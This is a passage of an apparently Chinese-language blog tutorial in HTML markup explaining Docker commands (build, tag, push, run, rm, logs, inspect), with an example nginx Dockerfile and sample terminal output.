class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;RootFS&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;layers&quot;</span>,<br>            <span class="hljs-string">&quot;Layers&quot;</span>: [<br>                <span class="hljs-string">&quot;sha256:1c79be3b9cebb9838b5c607567cb18eb50cd94e39b20a6241ca7d2d53dcffc89&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:c6652321c7b9deb69994b5490710e7ab52a38f5171eddbe6f4d47fb9ea928929&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:d00df4ca0725daf0ad547fcc9c731ed877d7b898559703ffe94e35de77ebd455&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:eb5d612bd5e0648b5dd9680101b778787652f435ac73db4b5e559b868392a314&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:01792ec538b3b8d67d341ad7b079beec9b289feb8a1e618b3fcfe2bb0c206a2b&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:7bc89178e1bbe5212cc907f798b0f3bb3e07c71083390703e04486012d398a4f&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;Metadata&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;LastTagTime&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><h3 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h3><p><strong>docker build [OPTIONS] PATH | URL | -</strong></p><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>已有的镜像不能满足业务需求，需要自己构建符合需求的镜像</p><h4 id="OPTIONS-4"><a href="#OPTIONS-4" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h5><p>–tag list</p><p>–target string  指定镜像 tag</p><h4 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h4><p>指定 Dockerfile 路径</p><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><h5 id="编写-Dockerfile-文件"><a href="#编写-Dockerfile-文件" class="headerlink" title="编写 Dockerfile 文件"></a>编写 Dockerfile 文件</h5><p>注意：文件名就是Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  test cat Dockerfile <br><span class="hljs-comment"># 使用官方的 Ubuntu 20.04 镜像作为基础</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-comment"># 作者信息</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;your-email@example.com&quot;</span></span><br><br><span class="hljs-comment"># 更新 apt 软件包列表并安装一个示例应用程序</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span><br><span class="language-bash">    nginx \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><br><span class="hljs-comment"># 将本地文件复制到镜像中</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html/</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 定义容器启动时运行的命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h5 id="build镜像"><a href="#build镜像" class="headerlink" title="build镜像"></a>build镜像</h5><p>docker build -t my-nginx-image .</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">➜  test docker build -t my-nginx-image .<br>[+] <span class="hljs-title class_">Building</span> <span class="hljs-number">74</span>.9s (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>) <span class="hljs-variable constant_">FINISHED</span>                                                                                                                                           <br> =&gt; [internal] load build definition from <span class="hljs-title class_">Dockerfile</span>                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">dockerfile:</span> 491B                                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load .dockerignore                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 2B                                                                                                                                        <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load metadata for docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span>                                                                                                        <span class="hljs-number">1</span>.4s<br> =&gt; [<span class="hljs-number">1</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">FROM</span> docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                 <span class="hljs-number">23</span>.4s<br> =&gt; =&gt; resolve docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                  <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322 <span class="hljs-number">1</span>.42kB / <span class="hljs-number">1</span>.42kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>26c3bd3ae441c873a210200bcbb975ffd2bbf0c0841a4584f4476c8a5b8f3d99 529B / 529B                                                                             <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>d5ca7a4456053674d490803005766890dd19e3f7e789a48737c0d462da531f5d <span class="hljs-number">1</span>.48kB / <span class="hljs-number">1</span>.48kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86 <span class="hljs-number">27</span>.17MB / <span class="hljs-number">27</span>.17MB                                                                      <span class="hljs-number">22</span>.6s<br> =&gt; =&gt; extracting <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86                                                                              <span class="hljs-number">0</span>.7s<br> =&gt; [internal] load build context                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 255B                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; [<span class="hljs-number">2</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">RUN</span> apt-get update &amp;&amp; apt-get install -y     nginx     &amp;&amp; rm -rf /var/lib/apt/lists/*                                                                       <span class="hljs-number">49</span>.7s<br> =&gt; [<span class="hljs-number">3</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">COPY</span> index.html /var/www/html/                                                                                                                               <span class="hljs-number">0</span>.0s <br> =&gt; exporting to image                                                                                                                                                 <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; exporting layers                                                                                                                                                <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; writing image <span class="hljs-symbol">sha256:</span>fd09b8e38b0e75b933c83996e55146d4a59e2c62b13c0daec733177186923b39                                                                           <span class="hljs-number">0</span>.0s <br> =&gt; =&gt; naming to docker.io/library/my-nginx-image  <br></code></pre></td></tr></table></figure><h2 id="添加TAG"><a href="#添加TAG" class="headerlink" title="添加TAG"></a>添加TAG</h2><h3 id="docker-tag"><a href="#docker-tag" class="headerlink" title="docker tag"></a>docker tag</h3><p><strong>docker tag 镜像名称:镜像版本 镜像新名称:镜像新版本</strong></p><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>为镜像设置tag</p><h4 id="OPTIONS-5"><a href="#OPTIONS-5" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h4 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker tag grafana/grafana:8.2.6 grafana:8.2.6.1</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana           <span class="hljs-number">8.2</span>.<span class="hljs-number">6.1</span>   aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br></code></pre></td></tr></table></figure><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><h3 id="docker-push"><a href="#docker-push" class="headerlink" title="docker push"></a><strong>docker push</strong></h3><p><strong>docker push [OPTIONS] NAME[:TAG]</strong></p><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>上传镜像到远程镜像仓库</p><h4 id="OPTIONS-6"><a href="#OPTIONS-6" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h5><p>–all-tags 上传所有tag的镜像到仓库</p><p>–disable-content-trust  关闭镜像签名校验，默认校验</p><p>-q</p><p>–quiet Suppress verbose output</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository <span class="hljs-selector-attr">[registry.xxx.xxx.xxx.xxx/hours/my-nginx-image]</span><br><span class="hljs-number">0</span>c192a2bcb80: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already exists <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br>➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span> -<span class="hljs-selector-tag">q</span><br>registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><h5 id="NAME-TAG"><a href="#NAME-TAG" class="headerlink" title="NAME[:TAG]"></a>NAME[:TAG]</h5><p>指定需要上传的镜像名或指定镜像TAG</p><p>不指定TAG，则使用默认TAG：latest</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><h6 id="不指定镜像仓库"><a href="#不指定镜像仓库" class="headerlink" title="不指定镜像仓库"></a>不指定镜像仓库</h6><p>默认会上传到 docker.io</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">➜  / docker push my-nginx-image<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> tag: latest<br>The push refers <span class="hljs-keyword">to</span> repository [docker.io/library/my-nginx-image]<br><span class="hljs-number">0</span>c192a2bcb80: Preparing <br><span class="hljs-symbol">bed1f48a7b1b:</span> Preparing <br><span class="hljs-number">350</span>f36b271de: Preparing <br><span class="hljs-symbol">denied:</span> requested access <span class="hljs-keyword">to</span> the resource <span class="hljs-built_in">is</span> denied<br></code></pre></td></tr></table></figure><h6 id="指定镜像仓库"><a href="#指定镜像仓库" class="headerlink" title="指定镜像仓库"></a>指定镜像仓库</h6><p>仓库域名&#x2F;项目名&#x2F;镜像名[:tag]</p><p>registry.xxx.xxx.xxx.xxx&#x2F;waf&#x2F;my-nginx-image:latest</p><h5 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h5><p>1、镜像添加tag</p><p>docker tag 镜像名:tag 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker tag <span class="hljs-keyword">my</span>-nginx-image:latest registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span><br><br>➜  / docker images | <span class="hljs-keyword">grep</span> <span class="hljs-number">2.0</span>     <br>registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image     <span class="hljs-number">2.0</span>          fd09b8e38b0e   <span class="hljs-number">5</span> days ago      <span class="hljs-number">123</span>MB<br></code></pre></td></tr></table></figure><p>2、上传镜像</p><p>可能需要登录，如果没有登录会提示（unauthorized: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push）</p><p>docker push 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker <span class="hljs-keyword">push</span> registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The <span class="hljs-keyword">push</span> refers to repository [registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image]<br>0c192a2bcb8<span class="hljs-number">0</span>: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already <span class="hljs-keyword">exists</span> <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br></code></pre></td></tr></table></figure><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p><p>docker run -itd  -p port1:port2 -v &#x2F;path:&#x2F;path IMAGE</p><p>dockerdocker二进制文件</p><p>run运行docker容器命令</p><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>创建并运行容器</p><h4 id="OPTIONS-7"><a href="#OPTIONS-7" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="–name-Name"><a href="#–name-Name" class="headerlink" title="–name  Name"></a>–name  Name</h5><p>设置容器名称</p><h5 id="i，–interactive"><a href="#i，–interactive" class="headerlink" title="-i，–interactive"></a>-i，–interactive</h5><p>Keep STDIN open even if not attached  为容器创建终端，即使没有连接</p><h5 id="t，–tty"><a href="#t，–tty" class="headerlink" title="-t，–tty"></a>-t，–tty</h5><p>Allocate a pseudo-TTY 为容器分配伪终端，允许你对容器内的标准输入进行交互</p><h5 id="d，–detch"><a href="#d，–detch" class="headerlink" title="-d，–detch"></a>-d，–detch</h5><p>Run container in background and print container ID  创建的容器运行在后台，输出容器id</p><h5 id="–rm"><a href="#–rm" class="headerlink" title="–rm"></a>–rm</h5><p>容器退出时自动清理容器内部的文件系统，不可与 -d 命令同时使用</p><p>只能自动清理 foreground 容器，不可自动清理 detached 容器，也会清理容器的匿名 data volumes</p><p>等价于容器退出后，执行 docker rm -v</p><h5 id="port1"><a href="#port1" class="headerlink" title="port1"></a>port1</h5><p>容器外端口，宿主机端口</p><h5 id="port2"><a href="#port2" class="headerlink" title="port2"></a>port2</h5><p>容器内端口</p><h5 id="IMAGE"><a href="#IMAGE" class="headerlink" title="IMAGE"></a>IMAGE</h5><p>镜像名</p><h5 id="v-path1-path2"><a href="#v-path1-path2" class="headerlink" title="-v &#x2F;path1:&#x2F;path2"></a>-v &#x2F;path1:&#x2F;path2</h5><p>挂载目录  &#x2F;path1 宿主机目录  &#x2F;path2 容器目录，也就是将宿主机挂载到容器中</p><h4 id="COMMAND"><a href="#COMMAND" class="headerlink" title="COMMAND"></a>COMMAND</h4><p>制定执行的命令，例如 &#x2F;bin&#x2F;bash 指定使用的bash</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker run -itd -<span class="hljs-keyword">p</span> <span class="hljs-number">8888</span>:<span class="hljs-number">80</span> -v /Users/admin/<span class="hljs-keyword">opt</span>/docker/:/<span class="hljs-keyword">opt</span>/ cento<span class="hljs-variable">s:7</span><br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> image <span class="hljs-string">&#x27;centos:7&#x27;</span> locally<br><span class="hljs-number">7</span>: Pulling from library/centos<br><span class="hljs-number">6717</span>b8ec66cd: Pull <span class="hljs-built_in">complete</span> <br>Digest: <span class="hljs-built_in">sha256</span>:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> cento<span class="hljs-variable">s:7</span><br><span class="hljs-number">0</span>fc471d9378c722e269c16673297223a77f1ba482bd67f0a4ad5f904bc9bd93f<br>➜  docker docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE      COMMAND       CREATED         STATUS         PORTS                  NAMES<br><span class="hljs-number">0</span>fc471d9378c   cento<span class="hljs-variable">s:7</span>   <span class="hljs-string">&quot;/bin/bash&quot;</span>   <span class="hljs-number">5</span> seconds ago   Up <span class="hljs-number">5</span> seconds   <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span>-&gt;<span class="hljs-number">80</span>/tcp   gifted_banach<br></code></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>docker rm id</p><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>删除指定容器</p><h4 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker rm dbea3aafd585</span><br>dbea3aafd585<br></code></pre></td></tr></table></figure><h2 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h2><p><strong>docker logs [-f] id</strong></p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>查看容器的日志信息</p><h4 id="OPTIONS-8"><a href="#OPTIONS-8" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-1"><a href="#f-1" class="headerlink" title="-f"></a>-f</h5><p>查看实时日志</p><h4 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h4><p>查看实时日志</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">➜  /tmp docker logs -f <span class="hljs-number">61804</span>e0083af<br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br></code></pre></td></tr></table></figure><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h3 id="docker-inspect-1"><a href="#docker-inspect-1" class="headerlink" title="docker inspect"></a>docker inspect</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>查看容器的基础数据</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span 